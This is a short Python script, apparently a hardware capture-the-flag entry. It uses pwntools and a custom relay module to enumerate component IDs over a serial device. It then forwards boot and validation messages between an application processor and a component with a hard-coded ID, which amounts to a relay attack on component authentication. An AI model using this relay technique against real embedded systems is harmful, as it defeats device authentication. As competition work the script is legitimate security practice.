import sys
sys.path.append('../relay')

from pwn import *
from relay import Relay, CompRelay, RelayEndpoint
import time

def list(relay):
    for i in range(128):
        print()
        print(i)
        relay.set_id(i)
        relay.send(b'\x01')
        answer = relay.recv()
        print(answer)
        print(len(answer))
        time.sleep(0.5)


# put your exploit code in this function
def exploit():
    # relay = RelayEndpoint('/dev/ttyACM1')
    # list(relay)
    # relayed component has this id
    # relay.set_id(0x5d42446e)
    # component on main board has this id
    # relay.set_id(0xcb9d6f46)
    # relay.set_id(0x3ff2f26f)

    # while True:
    #     relay.send(b'\x01')
    #     answer = relay.recv()
    #     print(answer)
    #     print(len(answer))
    #     time.sleep(1)

    # note: actuator is 0x5d42446e (component 0)
    # what actuator does: ap sends message [0]
    # actuator replied with message [0xf1]

    # c1 on board that is relayed between
    relay = Relay(0x5d42446e)
    relay.debug = True

    print('relay initialized')

    # while True:
    #     relay.send_to_comp(b'\x01')
    #     print(len(relay.recv_from_comp()))
    #     time.sleep(1)

    # forward first send validate
    relay.forward_to_comp()
    relay.forward_to_ap()

    # forward boot command
    relay.forward_to_comp()

    # forward the ap recieve verify
    relay.forward_to_ap()
    relay.forward_to_comp()
    relay.forward_to_ap()

    # forward boot message
    relay.forward_to_ap()

    # forward message asking what type of component it is in post boot
    relay.forward_to_comp()
    relay.forward_to_ap()

    i = 0
    while True:
        print(f"msg num: {i}")
        relay.forward_to_comp()
        relay.forward_to_ap()

if __name__ == "__main__":
    exploit()
